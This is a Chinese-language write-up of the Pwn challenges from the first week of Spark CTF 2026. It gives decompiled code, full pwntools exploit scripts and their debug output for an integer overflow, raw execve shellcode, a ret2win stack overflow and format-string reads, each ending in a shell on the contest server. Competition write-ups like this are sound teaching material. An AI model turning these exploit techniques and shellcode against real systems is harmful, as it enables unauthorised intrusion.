---
title: Spark CTF 2026 Writeup (1/5)
description: 比赛算是圆满结束了，这里我也将自己的 WP 公开出来吧，希望可以帮到其他对这个感兴趣的师傅。这是比赛的 Week 1 部分。
published: 2026-11-11
category: CTF
tags: [Spark CTF 2026, shellcode, 格式化字符串, ret2win, UPX, RC4, SQL 注入, git 泄露, LFI, RCE, 隐写, OSINT]
pinned: false
draft: false
image: https://img.halfcity.top/2026/11/11/44929c2f59dbfa428a2bc7d24bbdd26c.avif
---

## Pwn

### level_up?

#### 分析

IDA 反编译的结果如下：

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int gain; // [rsp+8h] [rbp-8h] BYREF
  int level; // [rsp+Ch] [rbp-4h]

  level = 2147483640;
  puts(s: &s);
  sleep(seconds: 1u);
  puts(s: "> /xp set joker233 2147483640 levels");
  sleep(seconds: 1u);
  puts(s: &s_);
  sleep(seconds: 1u);
  puts(s: &s__0);
  sleep(seconds: 1u);
  fwrite(ptr: &ptr_, size: 1u, n: 2u, s: stdout);
  fflush(stream: stdout);
  setvbuf(stream: stdin, buf: 0, modes: 2, n: 0);
  if ( (unsigned int)__isoc99_scanf(&unk_40209A, &gain) == 1 )
  {
    if ( gain > 0 && gain <= 100 )
    {
      level += gain;
      if ( level >= 0 )
      {
        puts(s: &s__1);
      }
      else
      {
        puts(s: &s__2);
        sleep(seconds: 1u);
        puts(s: &s__3);
        give_shell();
      }
      return 0;
    }
    else
    {
      puts(s: &s__4);
      return 0;
    }
  }
  else
  {
    puts(s: &s__5);
    return 1;
  }
}
```

```bash
.rodata:000000000040209A 25                 unk_40209A      db  25h ; %             ; DATA XREF: main+B1↑o
.rodata:000000000040209B 64                                 db  64h ; d
```

这里允许我们给 int level 加上一个 1-100 的数，其中 `level = 0x7FFFFFF8`，距离溢出只差 8。

因此这里存在整数溢出。

利用也很简单输入一个比 8 大的数字即可。

#### EXP

> 这里我建议写 exp 可以先写一个自己熟悉的模版，设定一些方便的东西，然后再填充内容。
>
> 至少我是挺喜欢这样子的。

```py
from pwn import *

exe = ELF("./level_up")

context.binary = exe
context.arch = "amd64"
context.gdb_binary = "pwndbg"
context.log_level = "debug"

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r)
    else:
        r = remote("110.42.112.160", 29496)

    return r

io = conn()

def send(data):
    global io

    log.info(f"sending payload: {data}")
    io.send(data)
    log.success("payload sent")

def sendline(data):
    global io

    log.info(f"sending payload: {data}")
    io.sendline(data)
    log.success("payload sent")

def interactive():
    global io

    log.info("try to interactive with target...")
    io.interactive()

def main():
    global io

    sendline(b"10")

    interactive()


if __name__ == "__main__":
    main()
```

结果：

```bash
❯ python exp.py
[*] '/home/halfcity/ctf/sparkctf/pwn/level_up/level_up'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
    Debuginfo:  Yes
[+] Opening connection to 110.42.112.160 on port 29496: Done
[*] sending payload: b'10'
[DEBUG] Sent 0x3 bytes:
    b'10\n'
[+] payload sent
[*] try to interactive with target...
[*] Switching to interactive mode
$ ls
[DEBUG] Sent 0x3 bytes:
    b'ls\n'
[DEBUG] Received 0x86 bytes:
    00000000  ef bc 88 e6  89 93 e5 bc  80 4d 43 e8  be 93 e5 85  │····│····│·MC·│····│
    00000010  a5 e6 a1 86  ef bc 89 0a  3e 20 2f 78  70 20 73 65  │····│····│> /x│p se│
    00000020  74 20 6a 6f  6b 65 72 32  33 33 20 32  31 34 37 34  │t jo│ker2│33 2│1474│
    00000030  38 33 36 34  30 20 6c 65  76 65 6c 73  0a e5 b7 b2  │8364│0 le│vels│····│
    00000040  e5 b0 86 6a  6f 6b 65 72  32 33 33 e7  9a 84 e7 bb  │···j│oker│233·│····│
    00000050  8f e9 aa 8c  e7 ad 89 e7  ba a7 e8 ae  be e4 b8 ba  │····│····│····│····│
    00000060  32 31 34 37  34 38 33 36  34 30 0a e4  b8 8d e8 a1  │2147│4836│40··│····│
    00000070  8c ef bc 8c  e5 86 8d e6  9d a5 e4 b8  80 e7 82 b9  │····│····│····│····│
    00000080  ef bc 81 0a  3e 20                                  │····│> │
    00000086
（打开MC输入框）
> /xp set joker233 2147483640 levels
已将joker233的经验等级设为2147483640
不行，再来一点！
> [DEBUG] Received 0x45 bytes:
    00000000  e5 b7 b2 e5  b0 86 6a 6f  6b 65 72 32  33 33 e7 9a  │····│··jo│ker2│33··│
    00000010  84 e7 bb 8f  e9 aa 8c e7  ad 89 e7 ba  a7 e8 ae be  │····│····│····│····│
    00000020  e4 b8 ba 2d  32 31 34 37  34 38 33 36  34 38 0a e5  │···-│2147│4836│48··│
    00000030  b9 b2 2e 2e  2e e5 b9 b2  e4 bb 80 e4  b9 88 e4 ba  │··..│.···│····│····│
    00000040  86 ef bc 9f  0a                                     │····│·│
    00000045
已将joker233的经验等级设为-2147483648
干...干什么了？
[DEBUG] Received 0x13 bytes:
    b'demo\n'
    b'entrypoint.sh\n'
demo
entrypoint.sh
$ cat /flag
[DEBUG] Sent 0xa bytes:
    b'cat /flag\n'
[DEBUG] Received 0x2b bytes:
    b'flag{3eb1b2ac-5416-0f20-67ad-f84c59b3f462}\n'
flag{3eb1b2ac-5416-0f20-67ad-f84c59b3f462}
$
```

### 哪边是好的

#### 分析

IDA 反编译的结果如下：

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int buf; // [rsp+Ch] [rbp-54h] BYREF
  char dest[72]; // [rsp+10h] [rbp-50h] BYREF
  unsigned __int64 v6; // [rsp+58h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  buf = 0;
  inital(argc, argv, envp);
  puts(s: "Level 1. send() vs. sendline()");
  printf(format: "Input: ");
  strcpy(dest: dest, src: bad);                            // "0123456789123456"
  read(fd: 0, buf: dest, nbytes: 8u);
  if ( strncmp(
         s1: dest,
         s2: good,                                  // "ILovePwn"
         n: 8u) )
  {
    die();
  }
  printf(format: "Input: ");
  strcpy(dest: dest, src: bad);                            // "0123456789123456"
  fgets(s: dest, n: 64, stream: stdin);
  if ( strncmp(
         s1: dest,
         s2: good,                                  // "ILovePwn"
         n: 8u) )
  {
    die();
  }
  puts(s: "Level 2. p32() vs. str()");
  printf(format: "Input: ");
  buf = 0;
  __isoc99_scanf("%d", &buf);
  if ( buf != 1131796 )
    die();
  printf(format: "Do you want a getc(stdin)[y/N]? ");
  read(fd: 0, buf: dest, nbytes: 1u);
  if ( dest[0] == 121 || dest[0] == 89 )
    getc(stream: stdin);
  printf(format: "Input: ");
  buf = 0;
  read(fd: 0, buf: &buf, nbytes: 4u);
  if ( buf != 26318864 )
    die();
  puts(s: "Level 3. \\0 or not");
  printf(format: "Input: ");
  strcpy(dest: dest, src: bad);                            // "0123456789123456"
  fgets(s: dest, n: 9, stream: stdin);
  if ( strcmp(s1: dest, s2: good) )                     // "ILovePwn"
    die();
  printf(format: "Input: ");
  strcpy(dest: dest, src: bad);                            // "0123456789123456"
  fread(ptr: dest, size: 1u, n: 0xAu, stream: stdin);
  if ( strcmp(s1: dest, s2: good) )                     // "ILovePwn"
    die();
  printf(format: "Input: ");
  strcpy(dest: dest, src: bad);                            // "0123456789123456"
  __isoc99_scanf("%8s", dest);
  if ( strcmp(s1: dest, s2: good) )                     // "ILovePwn"
    die();
  puts(s: "Congratulations! Give you a shell~");
  system(command: "/bin/sh");
  return 0;
}
```

#### Track 1

题目要求输入 `ILovePwn`。

`read` 仅接受字节流而 `fgets` 需要换行符标识结束。

我们可以这样实现

```py
io.recvuntil(b"Input: ")
send(b"ILovePwn")
io.recvuntil(b"Input: ")
sendline(b"ILovePwn")
```

#### Track 2

此处 `scanf` 接受字符并转化为 int。

选择接受 `getc` 这样就可以将缓冲区中最后的换行符消费掉。

最后同样的 `read` 接受字节流，注意小端打包下：

```py
io.recvuntil(b"Input: ")
sendline(b"1131796")

io.recvuntil(b"Do you want a getc(stdin)[y/N]? ")
send(b"y")

io.recvuntil(b"Input: ")
send(p32(0x1919810))
```

#### Track 3

`fgets` 会在末尾补充一个 `0x00` ，所以这里直接写即可。

`fread` 是直接读取的字节流，我们需要手动补 0x00。

`__isoc99_scanf` 同样，直接写字符串即可。

```py
io.recvuntil(b"Input: ")

send(b"ILovePwn")

io.recvuntil(b"Input: ")
send(b"ILovePwn\x00\x00")

io.recvuntil(b"Input: ")
sendline(b"ILovePwn")
```

#### EXP

完整 exp 如下：

```py
from pwn import *

exe = ELF("./which")

context.binary = exe
context.arch = "amd64"
context.gdb_binary = "pwndbg"
context.log_level = "debug"

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r)
    else:
        r = remote("110.42.112.160", 49945)

    return r

io = conn()

def send(data):
    global io

    log.info(f"sending payload: {data}")
    io.send(data)
    log.success("payload sent")

def sendline(data):
    global io

    log.info(f"sending payload: {data}")
    io.sendline(data)
    log.success("payload sent")

def interactive():
    global io

    log.info("try to interactive with target...")
    io.interactive()

def main():
    global io

    io.recvuntil(b"Input: ")
    send(b"ILovePwn")
    io.recvuntil(b"Input: ")
    sendline(b"ILovePwn")

    io.recvuntil(b"Input: ")
    sendline(b"1131796")

    io.recvuntil(b"Do you want a getc(stdin)[y/N]? ")
    send(b"y")

    io.recvuntil(b"Input: ")
    send(p32(0x1919810))

    io.recvuntil(b"Input: ")

    send(b"ILovePwn")

    io.recvuntil(b"Input: ")
    send(b"ILovePwn\x00\x00")

    io.recvuntil(b"Input: ")
    sendline(b"ILovePwn")

    interactive()


if __name__ == "__main__":
    main()
```

输出：

```bash
❯ python exp.py
[*] '/home/halfcity/ctf/sparkctf/pwn/which_good/which'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
[+] Opening connection to 110.42.112.160 on port 49945: Done
[DEBUG] Received 0x1e bytes:
    b'Level 1. send() vs. sendline()'
[DEBUG] Received 0x8 bytes:
    b'\n'
    b'Input: '
[*] sending payload: b'ILovePwn'
[DEBUG] Sent 0x8 bytes:
    b'ILovePwn'
[+] payload sent
[DEBUG] Received 0x7 bytes:
    b'Input: '
[*] sending payload: b'ILovePwn'
[DEBUG] Sent 0x9 bytes:
    b'ILovePwn\n'
[+] payload sent
[DEBUG] Received 0x18 bytes:
    b'Level 2. p32() vs. str()'
[DEBUG] Received 0x8 bytes:
    b'\n'
    b'Input: '
[*] sending payload: b'1131796'
[DEBUG] Sent 0x8 bytes:
    b'1131796\n'
[+] payload sent
[DEBUG] Received 0x20 bytes:
    b'Do you want a getc(stdin)[y/N]? '
[*] sending payload: b'y'
[DEBUG] Sent 0x1 bytes:
    b'y'
[+] payload sent
[DEBUG] Received 0x7 bytes:
    b'Input: '
[*] sending payload: b'\x10\x98\x91\x01'
[DEBUG] Sent 0x4 bytes:
    00000000  10 98 91 01                                         │····│
    00000004
[+] payload sent
[DEBUG] Received 0x12 bytes:
    b'Level 3. \\0 or not'
[DEBUG] Received 0x8 bytes:
    b'\n'
    b'Input: '
[*] sending payload: b'ILovePwn'
[DEBUG] Sent 0x8 bytes:
    b'ILovePwn'
[+] payload sent
[DEBUG] Received 0x7 bytes:
    b'Input: '
[*] sending payload: b'ILovePwn\x00\x00'
[DEBUG] Sent 0xa bytes:
    00000000  49 4c 6f 76  65 50 77 6e  00 00                     │ILov│ePwn│··│
    0000000a
[+] payload sent
[DEBUG] Received 0x7 bytes:
    b'Input: '
[*] sending payload: b'ILovePwn'
[DEBUG] Sent 0x9 bytes:
    b'ILovePwn\n'
[+] payload sent
[*] try to interactive with target...
[*] Switching to interactive mode
[DEBUG] Received 0x22 bytes:
    b'Congratulations! Give you a shell~'
Congratulations! Give you a shell~[DEBUG] Received 0x1 bytes:
    b'\n'

$ ls
[DEBUG] Sent 0x3 bytes:
    b'ls\n'
[DEBUG] Received 0x2b bytes:
    b'bin\n'
    b'dev\n'
    b'flag\n'
    b'lib\n'
    b'lib32\n'
    b'lib64\n'
    b'libexec\n'
    b'which\n'
bin
dev
flag
lib
lib32
lib64
libexec
which
$ cat /flag
[DEBUG] Sent 0xa bytes:
    b'cat /flag\n'
[DEBUG] Received 0x26 bytes:
    b'flag{PwnTOoL5-lS_POw3rfU1-8b51810162}\n'
flag{PwnTOoL5-lS_POw3rfU1-8b51810162}
$
```

### Abyss Shellcode

#### 分析

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  void *buf; // [rsp+8h] [rbp-18h]

  setbuf(stream: stdin, buf: 0);
  setbuf(stream: stdout, buf: 0);
  setbuf(stream: stderr, buf: 0);
  puts(s: "Give me your shellcode:");
  buf = mmap(addr: 0, len: 0x1000u, prot: 7, flags: 34, fd: -1, offset: 0);
  if ( buf == (void *)-1LL )
  {
    perror(s: "mmap");
    exit(status: 1);
  }
  if ( read(fd: 0, buf: buf, nbytes: 0x1000u) <= 0 )
  {
    puts(s: "No shellcode?");
    exit(status: 1);
  }
  ((void(void))buf)();
  return 0;
}
```

逻辑很简单，读取输入到分配的一页 rwx 内存，然后执行。

直接写 shellcode 即可。

### EXP

```py
from pwn import *

exe = ELF("./pwn")

context.binary = exe
context.arch = "amd64"
context.gdb_binary = "pwndbg"
context.log_level = "debug"

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r)
    else:
        r = remote("110.42.112.160", 24256)

    return r

io = conn()

def send(data):
    global io

    log.info(f"sending payload: {data}")
    io.send(data)
    log.success("payload sent")

def sendline(data):
    global io

    log.info(f"sending payload: {data}")
    io.sendline(data)
    log.success("payload sent")

def interactive():
    global io

    log.info("try to interactive with target...")
    io.interactive()

def main():
    global io

    send(asm(shellcraft.sh()))

    interactive()


if __name__ == "__main__":
    main()
```

输出：

```bash
❯ python exp.py
[*] '/home/halfcity/ctf/sparkctf/pwn/abyssshellcode/pwn'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
    Debuginfo:  Yes
[+] Opening connection to 110.42.112.160 on port 24256: Done
[DEBUG] cpp -Wno-unused-command-line-argument -C -nostdinc -undef -P -I/usr/lib/python3/dist-packages/pwnlib/data/includes
[DEBUG] Assembling
    .section .shellcode,"awx"
    .global _start
    .global __start
    _start:
    __start:
    .intel_syntax noprefix
    .p2align 0
        /* execve(path='/bin///sh', argv=['sh'], envp=0) */
        /* push b'/bin///sh\x00' */
        push 0x68
        mov rax, 0x732f2f2f6e69622f
        push rax
        mov rdi, rsp
        /* push argument array ['sh\x00'] */
        /* push b'sh\x00' */
        push 0x1010101 ^ 0x6873
        xor dword ptr [rsp], 0x1010101
        xor esi, esi /* 0 */
        push rsi /* null terminate */
        push 8
        pop rsi
        add rsi, rsp
        push rsi /* 'sh\x00' */
        mov rsi, rsp
        xor edx, edx /* 0 */
        /* call execve() */
        push 59 /* 0x3b */
        pop rax
        syscall
[DEBUG] Using cached assembly output from '/home/halfcity/.cache/.pwntools-cache-3.13/asm-cache/99cb4b07dea4b242573197a57eaac16709adb122'
[*] sending payload: b'jhH\xb8/bin///sPH\x89\xe7hri\x01\x01\x814$\x01\x01\x01\x011\xf6Vj\x08^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05'
[DEBUG] Sent 0x30 bytes:
    00000000  6a 68 48 b8  2f 62 69 6e  2f 2f 2f 73  50 48 89 e7  │jhH·│/bin│///s│PH··│
    00000010  68 72 69 01  01 81 34 24  01 01 01 01  31 f6 56 6a  │hri·│··4$│····│1·Vj│
    00000020  08 5e 48 01  e6 56 48 89  e6 31 d2 6a  3b 58 0f 05  │·^H·│·VH·│·1·j│;X··│
    00000030
[+] payload sent
[*] try to interactive with target...
[*] Switching to interactive mode
[DEBUG] Received 0x18 bytes:
    b'Give me your shellcode:\n'
Give me your shellcode:
$ ls
[DEBUG] Sent 0x3 bytes:
    b'ls\n'
[DEBUG] Received 0x2d bytes:
    b'bin\n'
    b'dev\n'
    b'flag\n'
    b'lib\n'
    b'lib32\n'
    b'lib64\n'
    b'libs\n'
    b'pwn\n'
    b'secret\n'
bin
dev
flag
lib
lib32
lib64
libs
pwn
secret
$ cat /flag
[DEBUG] Sent 0xa bytes:
    b'cat /flag\n'
[DEBUG] Received 0x2a bytes:
    b'flag{82d591ff-4d62-ce64-bd65-837a1ff723b9}'
flag{82d591ff-4d62-ce64-bd65-837a1ff723b9}$
```

### Heavensdoor

#### 分析

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  __int64 buf_; // [rsp+0h] [rbp-28h] BYREF

  setvbuf(stream: stdout, buf: 0, modes: 2, n: 0);
  setvbuf(stream: stdin, buf: 0, modes: 2, n: 0);
  setvbuf(stream: stderr, buf: 0, modes: 2, n: 0);
  puts(s: "**************************************");
  puts(s: "*          H e a v e n s d o o r     *");
  puts(s: "**************************************");
  puts(s: "You found a door nobody ever opens.");
  puts(s: "Now, knock.");
  read(fd: 0, buf: &buf_, nbytes: 0x100u);
  puts(s: "Nothing happens... right?");
  return 0;
}

int heavens_door()
{
  puts(s: "Knock, knock.");
  puts(s: "It's open. Come in.");
  system(command: "/bin/sh");
  return puts(s: "The door closes behind you.");
}
```

在 IDA 中可以看到后门函数，因此这个题目是 ret2win。

```bash
-0000000000000028 // Use data definition commands to manipulate stack variables and arguments.
-0000000000000028 // Frame size: 28; Saved regs: 0; Purge: 0
-0000000000000028
-0000000000000028     // padding byte
-0000000000000027     // padding byte
-0000000000000026     // padding byte
-0000000000000025     // padding byte
-0000000000000024     // padding byte
-0000000000000023     // padding byte
-0000000000000022     // padding byte
-0000000000000021     // padding byte
-0000000000000020     // padding byte
-000000000000001F     // padding byte
-000000000000001E     // padding byte
-000000000000001D     // padding byte
-000000000000001C     // padding byte
-000000000000001B     // padding byte
-000000000000001A     // padding byte
-0000000000000019     // padding byte
-0000000000000018     // padding byte
-0000000000000017     // padding byte
-0000000000000016     // padding byte
-0000000000000015     // padding byte
-0000000000000014     // padding byte
-0000000000000013     // padding byte
-0000000000000012     // padding byte
-0000000000000011     // padding byte
-0000000000000010     // padding byte
-000000000000000F     // padding byte
-000000000000000E     // padding byte
-000000000000000D     // padding byte
-000000000000000C     // padding byte
-000000000000000B     // padding byte
-000000000000000A     // padding byte
-0000000000000009     // padding byte
-0000000000000008     // padding byte
-0000000000000007     // padding byte
-0000000000000006     // padding byte
-0000000000000005     // padding byte
-0000000000000004     // padding byte
-0000000000000003     // padding byte
-0000000000000002     // padding byte
-0000000000000001     // padding byte
+0000000000000000     _UNKNOWN *__return_address;
```

padding 大小是 0x28 存在明显溢出。

```bash
❯ ROPgadget --binary heavensdoor|grep ret
0x00000000004011ab : add bh, bh ; loopne 0x401215 ; nop ; ret
0x000000000040117c : add byte ptr [rax], al ; add byte ptr [rax], al ; endbr64 ; ret
0x000000000040121a : add byte ptr [rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x000000000040117e : add byte ptr [rax], al ; endbr64 ; ret
0x000000000040121b : add byte ptr [rcx], al ; pop rbp ; ret
0x0000000000401219 : add byte ptr cs:[rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x00000000004011aa : add dil, dil ; loopne 0x401215 ; nop ; ret
0x000000000040121c : add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x0000000000401217 : add eax, 0x2e6b ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x0000000000401145 : add esp, 0x28 ; ret
0x0000000000401017 : add esp, 8 ; ret
0x0000000000401144 : add rsp, 0x28 ; ret
0x0000000000401016 : add rsp, 8 ; ret
0x0000000000401183 : cli ; ret
0x0000000000401277 : cli ; sub rsp, 8 ; add rsp, 8 ; ret
0x0000000000401180 : endbr64 ; ret
0x0000000000401218 : imul ebp, dword ptr [rsi], 0 ; add byte ptr [rcx], al ; pop rbp ; ret
0x00000000004011ad : loopne 0x401215 ; nop ; ret
0x0000000000401216 : mov byte ptr [rip + 0x2e6b], 1 ; pop rbp ; ret
0x00000000004011af : nop ; ret
0x000000000040121d : pop rbp ; ret
0x000000000040101a : ret
0x0000000000401011 : sal byte ptr [rdx + rax - 1], 0xd0 ; add rsp, 8 ; ret
0x0000000000401279 : sub esp, 8 ; add rsp, 8 ; ret
0x0000000000401278 : sub rsp, 8 ; add rsp, 8 ; ret
0x0000000000401142 : xor eax, eax ; add rsp, 0x28 ; ret
```

这里有 ret 的 gadget 可以用于栈 16 字节对齐。

#### EXP

```py
from pwn import *

exe = ELF("./heavensdoor")

context.binary = exe
context.arch = "amd64"
context.gdb_binary = "pwndbg"
context.log_level = "debug"

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r)
    else:
        r = remote("110.42.112.160", 28785)

    return r

io = conn()

def send(data):
    global io

    log.info(f"sending payload: {data}")
    io.send(data)
    log.success("payload sent")

def sendline(data):
    global io

    log.info(f"sending payload: {data}")
    io.sendline(data)
    log.success("payload sent")

def interactive():
    global io

    log.info("try to interactive with target...")
    io.interactive()

def main():
    global io

    backdoor = 0x401240
    ret = 0x40101a

    io.recvuntil(b"Now, knock.")

    payload = b"A" * 0x28
    payload += p64(ret)
    payload += p64(backdoor)

    send(payload)

    interactive()


if __name__ == "__main__":
    main()
```

输出：

```bash
❯ python exp.py
[*] '/home/halfcity/ctf/sparkctf/pwn/heavensdoor/heavensdoor'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
[+] Opening connection to 110.42.112.160 on port 28785: Done
[DEBUG] Received 0xa5 bytes:
    b'**************************************\n'
    b'*          H e a v e n s d o o r     *\n'
    b'**************************************\n'
    b'You found a door nobody ever opens.\n'
    b'Now, knock.\n'
[*] sending payload: b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x1a\x10@\x00\x00\x00\x00\x00@\x12@\x00\x00\x00\x00\x00'
[DEBUG] Sent 0x38 bytes:
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    *
    00000020  41 41 41 41  41 41 41 41  1a 10 40 00  00 00 00 00  │AAAA│AAAA│··@·│····│
    00000030  40 12 40 00  00 00 00 00                            │@·@·│····│
    00000038
[+] payload sent
[*] try to interactive with target...
[*] Switching to interactive mode

[DEBUG] Received 0x3c bytes:
    b'Nothing happens... right?\n'
    b'Knock, knock.\n'
    b"It's open. Come in.\n"
Nothing happens... right?
Knock, knock.
It's open. Come in.
$ cat /flag
[DEBUG] Sent 0xa bytes:
    b'cat /flag\n'
[DEBUG] Received 0x2e bytes:
    b'flag{KnOck-KN0CK_h34v3NSd0Or-0P3N3de1f3142d3}\n'
flag{KnOck-KN0CK_h34v3NSd0Or-0P3N3de1f3142d3}
$
```

### 格式化打印机

#### Track 1

```bash
❯ nc 110.42.112.160 48200
=== 格式化打印机 ===
8 个位置里放着一些数，你需要用格式串找到标记，再完成目标
%lx 依次取数并打印十六进制；点号只是分隔符，l 是小写字母 L
直接输入格式串可以探索；输入 submit 后，下一行才作为答案
hint：思路  map：已发现的位置  explore：取消提交  quit：退出

=== 1/3  找到标记 ===
  找到 41414141，先试着打印，确定它是第几个数
  最后只用一个取数规则打印它，不能直接写数字

  这 8 个数放在哪里？（调用 printf 时的位置示意）
  第 1~5 个在寄存器里，第 6~8 个在栈里，???????? 表示还没取过
  +------+--------------+----------+----------+
  | 编号 | 位置         | 数值     | 首次步骤 |
  +------+--------------+----------+----------+
  | 1    | RSI          | ???????? | -        |
  | 2    | RDX          | ???????? | -        |
  | 3    | RCX          | ???????? | -        |
  | 4    | R8           | ???????? | -        |
  | 5    | R9           | ???????? | -        |
  +------+--------------+----------+----------+
  | 6    | [RSP+0x08]   | ???????? | -        |
  | 7    | [RSP+0x10]   | ???????? | -        |
  | 8    | [RSP+0x18]   | ???????? | -        |
  +------+--------------+----------+----------+
  RSI 等是寄存器名称；[RSP+0x08] 表示从栈顶往后 8 字节的位置

探索>
```

根据题目要求我们需要利用格式化字符串打印目标数据。

> 格式化字符串打印的公式如下：%[参数位置$][标志][宽度][.精度][长度]转换符

> 注：格式化字符串的参数是虚拟参数，参数偏移依赖 System V ABI 的传参约定，

我们先检查一下寄存器和栈上的值：

```bash
探索> %lx.%lx.%lx.%lx.%lx.%lx.%lx
  你写的规则：[%lx.%lx.%lx.%lx.%lx.%lx.%lx]
  打印结果：  [2a.22222222.33333333.44444444.55555555.42424242.41414141]

  这 8 个数放在哪里？（调用 printf 时的位置示意）
  第 1~5 个在寄存器里，第 6~8 个在栈里，???????? 表示还没取过
  +------+--------------+----------+----------+
  | 编号 | 位置         | 数值     | 首次步骤 |
  +------+--------------+----------+----------+
  | 1    | RSI          | 0000002a | 1        |
  | 2    | RDX          | 22222222 | 2        |
  | 3    | RCX          | 33333333 | 3        |
  | 4    | R8           | 44444444 | 4        |
  | 5    | R9           | 55555555 | 5        |
  +------+--------------+----------+----------+
  | 6    | [RSP+0x08]   | 42424242 | 6        |
  | 7    | [RSP+0x10]   | 41414141 | 7        |
  | 8    | [RSP+0x18]   | ???????? | -        |
  +------+--------------+----------+----------+
  RSI 等是寄存器名称；[RSP+0x08] 表示从栈顶往后 8 字节的位置

  它是这样取数的（从第 1 个开始）：
  第 1 步  %lx      -> 第 1 个数 -> RSI          -> 打印 2a
  第 2 步  %lx      -> 第 2 个数 -> RDX          -> 打印 22222222
  第 3 步  %lx      -> 第 3 个数 -> RCX          -> 打印 33333333
  第 4 步  %lx      -> 第 4 个数 -> R8           -> 打印 44444444
  第 5 步  %lx      -> 第 5 个数 -> R9           -> 打印 55555555
  第 6 步  %lx      -> 第 6 个数 -> [RSP+0x08]   -> 打印 42424242
  第 7 步  %lx      -> 第 7 个数 -> [RSP+0x10]   -> 打印 41414141
  这里只是把数取出来打印，原来的数没有被改动
  [探索] 准备好后输入 submit
```

提交参数偏移 7 处的值即可：

```bash  
探索> submit
下一行提交答案，最多 16 个字符

提交> %7$lx
  你写的规则：[%7$lx]
  打印结果：  [41414141]
```

#### Track 2

```bash
=== 2/3  编号还是宽度 ===
  目标：000041414141.000042424242
  找到两个标记，按这个顺序打印，每个补零到 12 位
  最终格式串最多 17 个字符；探索时不受这个限制
```

再次检查一下数值：

```bash
探索> %lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx
  你写的规则：[%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx]
  打印结果：  [2a.22222222.33333333.44444444.55555555.42424242.41414141.88888888]

  这 8 个数放在哪里？（调用 printf 时的位置示意）
  第 1~5 个在寄存器里，第 6~8 个在栈里，???????? 表示还没取过
  +------+--------------+----------+----------+
  | 编号 | 位置         | 数值     | 首次步骤 |
  +------+--------------+----------+----------+
  | 1    | RSI          | 0000002a | 1        |
  | 2    | RDX          | 22222222 | 2        |
  | 3    | RCX          | 33333333 | 3        |
  | 4    | R8           | 44444444 | 4        |
  | 5    | R9           | 55555555 | 5        |
  +------+--------------+----------+----------+
  | 6    | [RSP+0x08]   | 42424242 | 6        |
  | 7    | [RSP+0x10]   | 41414141 | 7        |
  | 8    | [RSP+0x18]   | 88888888 | 8        |
  +------+--------------+----------+----------+
  RSI 等是寄存器名称；[RSP+0x08] 表示从栈顶往后 8 字节的位置

  它是这样取数的（从第 1 个开始）：
  第 1 步  %lx      -> 第 1 个数 -> RSI          -> 打印 2a
  第 2 步  %lx      -> 第 2 个数 -> RDX          -> 打印 22222222
  第 3 步  %lx      -> 第 3 个数 -> RCX          -> 打印 33333333
  第 4 步  %lx      -> 第 4 个数 -> R8           -> 打印 44444444
  第 5 步  %lx      -> 第 5 个数 -> R9           -> 打印 55555555
  第 6 步  %lx      -> 第 6 个数 -> [RSP+0x08]   -> 打印 42424242
  第 7 步  %lx      -> 第 7 个数 -> [RSP+0x10]   -> 打印 41414141
  第 8 步  %lx      -> 第 8 个数 -> [RSP+0x18]   -> 打印 88888888
  这里只是把数取出来打印，原来的数没有被改动
  [探索] 准备好后输入 submit
```

提交 `%7$012lx.%6$012lx` 即可。

其中 `%` 是固定的起始符号，`N$` 表示参数偏移，`012lx` 中的 `l` 表示 long 类型，`x` 表示以 hex 也就是 16 进制小写的方式输出，`012`表示使用0将长度填充到12

```bash
探索> submit
下一行提交答案，最多 17 个字符

提交> %7$012lx.%6$012lx
  你写的规则：[%7$012lx.%6$012lx]
  打印结果：  [000041414141.000042424242]
```

#### Track 3

```bash
=== 3/3  重新定位，再组合 ===
  位置已重新打乱，之前的编号不能直接照搬
  目标：42424242.41414141.41414141.0000002a.%
  先找位置，再按顺序取数；同一个标记要取两次，最多 40 个字符

  这 8 个数放在哪里？（调用 printf 时的位置示意）
  第 1~5 个在寄存器里，第 6~8 个在栈里，???????? 表示还没取过
  +------+--------------+----------+----------+
  | 编号 | 位置         | 数值     | 首次步骤 |
  +------+--------------+----------+----------+
  | 1    | RSI          | ???????? | -        |
  | 2    | RDX          | ???????? | -        |
  | 3    | RCX          | ???????? | -        |
  | 4    | R8           | ???????? | -        |
  | 5    | R9           | ???????? | -        |
  +------+--------------+----------+----------+
  | 6    | [RSP+0x08]   | ???????? | -        |
  | 7    | [RSP+0x10]   | ???????? | -        |
  | 8    | [RSP+0x18]   | ???????? | -        |
  +------+--------------+----------+----------+
  RSI 等是寄存器名称；[RSP+0x08] 表示从栈顶往后 8 字节的位置
```

最后的综合利用。

payload 如下：

```bash
提交> %3$08lx.%2$08lx.%2$08lx.%7$08lx.%%
